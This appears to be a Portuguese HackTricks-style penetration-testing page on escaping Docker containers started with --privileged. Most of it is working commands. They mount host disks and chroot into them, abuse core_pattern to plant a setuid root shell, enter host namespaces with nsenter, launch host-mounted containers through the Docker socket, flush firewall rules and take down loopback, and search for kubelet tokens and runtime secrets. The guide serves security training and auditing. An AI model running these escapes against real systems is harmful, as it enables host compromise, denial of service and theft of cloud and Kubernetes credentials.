# Escaping De Contêineres `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Visão Geral

Um contêiner iniciado com `--privileged` não é a mesma coisa que um contêiner normal com uma ou duas permissões adicionais. Na prática, `--privileged` remove ou enfraquece várias proteções padrão do runtime que normalmente mantêm a workload afastada de recursos perigosos do host. O efeito exato ainda depende do runtime e do host, mas, no Docker, o resultado usual é:

- todas as capabilities são concedidas
- as restrições do device cgroup são removidas
- muitos sistemas de arquivos do kernel deixam de ser montados como somente leitura
- os caminhos padrão mascarados do procfs desaparecem
- o filtro seccomp é desativado
- o confinamento do AppArmor é desativado
- o isolamento do SELinux é desativado ou substituído por um label muito mais amplo

A consequência importante é que um contêiner privileged geralmente **não** precisa de um kernel exploit sutil. Em muitos casos, ele pode simplesmente interagir diretamente com dispositivos do host, sistemas de arquivos do kernel voltados ao host ou interfaces do runtime e, em seguida, fazer pivot para um shell do host.

## O Que `--privileged` Não Altera Automaticamente

`--privileged` **não** ingressa automaticamente nos namespaces PID, de rede, IPC ou UTS do host. Um contêiner privileged ainda pode ter namespaces privados. Isso significa que algumas cadeias de escape exigem uma condição adicional, como:

- um bind mount do host
- compartilhamento do PID do host
- rede do host
- dispositivos do host visíveis
- interfaces proc/sys com permissão de escrita

Essas condições geralmente são fáceis de satisfazer em misconfigurations reais, mas são conceitualmente separadas do próprio `--privileged`.

## Caminhos de Escape

### 1. Montar o Disco do Host Através de Dispositivos Expostos

Um contêiner privileged geralmente vê muito mais device nodes em `/dev`. Se o dispositivo de bloco do host estiver visível, o escape mais simples é montá-lo e executar `chroot` no filesystem do host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Se a partição root não for óbvia, enumere primeiro o layout de blocos:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Se o caminho prático for plantar um helper setuid em um mount do host com permissão de escrita, em vez de usar `chroot`, lembre-se de que nem todo filesystem respeita o bit setuid. Uma verificação rápida dos recursos no host é:
```bash
mount | grep -v "nosuid"
```
Isso é útil porque caminhos graváveis em filesystems `nosuid` são muito menos interessantes para workflows clássicos de "colocar um shell setuid e executá-lo posteriormente".

As proteções enfraquecidas abusadas aqui são:

- exposição completa de dispositivos
- capabilities amplas, especialmente `CAP_SYS_ADMIN`

Páginas relacionadas:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Montar Ou Reutilizar Um Bind Mount Do Host E Usar `chroot`

Se o filesystem raiz do host já estiver montado dentro do container, ou se o container puder criar os mounts necessários por ser privileged, um shell do host geralmente estará a apenas um `chroot` de distância:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se não existir um bind mount da root do host, mas o armazenamento do host estiver acessível, crie um:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Este caminho explora:

- restrições de montagem enfraquecidas
- capabilities completas
- ausência de confinement por MAC

Páginas relacionadas:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Abuse `/proc/sys` Ou `/sys` Gravável

Uma das principais consequências de `--privileged` é que as proteções do procfs e do sysfs se tornam muito mais fracas. Isso pode expor interfaces do kernel voltadas ao host que normalmente são mascaradas ou montadas como somente leitura.

Um exemplo clássico é `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Outros caminhos de alto valor incluem:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Este caminho explora:

- caminhos mascarados ausentes
- caminhos do sistema somente leitura ausentes

Páginas relacionadas:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Usar Full Capabilities Para Escape Baseado em Mount ou Namespace

Um container privilegiado obtém as capabilities que normalmente são removidas de containers padrão, incluindo `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` e muitas outras. Isso geralmente é suficiente para transformar um foothold local em um escape do host assim que outra superfície exposta existir.

Um exemplo simples é montar filesystems adicionais e usar a entrada em namespaces:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Se o PID do host também for compartilhado, o procedimento fica ainda mais curto:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Este caminho explora:

- o conjunto padrão de capabilities privilegiadas
- o compartilhamento opcional do PID do host

Páginas relacionadas:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape Através de Runtime Sockets

Um container privilegiado frequentemente acaba tendo o estado ou os sockets do runtime do host visíveis. Se um socket do Docker, containerd ou CRI-O estiver acessível, a abordagem mais simples geralmente é usar a API do runtime para iniciar um segundo container com acesso ao host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Para containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Este caminho abusa de:

- exposição do runtime privilegiado
- bind mounts do host criados pelo próprio runtime

Páginas relacionadas:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Remover os efeitos colaterais do isolamento de rede

`--privileged` por si só não ingressa no network namespace do host, mas se o container também tiver `--network=host` ou outro acesso à rede do host, toda a network stack se torna mutável:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Isso nem sempre resulta em um shell direto no host, mas pode permitir negação de serviço, interceptação de tráfego ou acesso a serviços de gerenciamento acessíveis apenas via loopback.

Páginas relacionadas:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Ler Segredos do Host e o Estado do Runtime

Mesmo quando um escape de shell limpo não é imediato, containers privilegiados geralmente têm acesso suficiente para ler segredos do host, o estado do kubelet, metadados do runtime e sistemas de arquivos de containers vizinhos:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Se `/var` estiver montado a partir do host ou os diretórios de runtime estiverem visíveis, isso pode ser suficiente para movimento lateral ou roubo de credenciais de cloud/Kubernetes mesmo antes de obter um shell no host.

Páginas relacionadas:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Verificações

O objetivo dos comandos a seguir é confirmar quais famílias de escape de privileged containers são imediatamente viáveis.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
O que é interessante aqui:

- um conjunto completo de capabilities, especialmente `CAP_SYS_ADMIN`
- exposição gravável de proc/sys
- dispositivos do host visíveis
- ausência de seccomp e de confinamento MAC
- runtime sockets ou bind mounts da raiz do host

Qualquer um desses itens pode ser suficiente para post-exploitation. Vários deles juntos geralmente significam que o container está funcionalmente a um ou dois comandos de comprometer o host.

## Páginas relacionadas

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
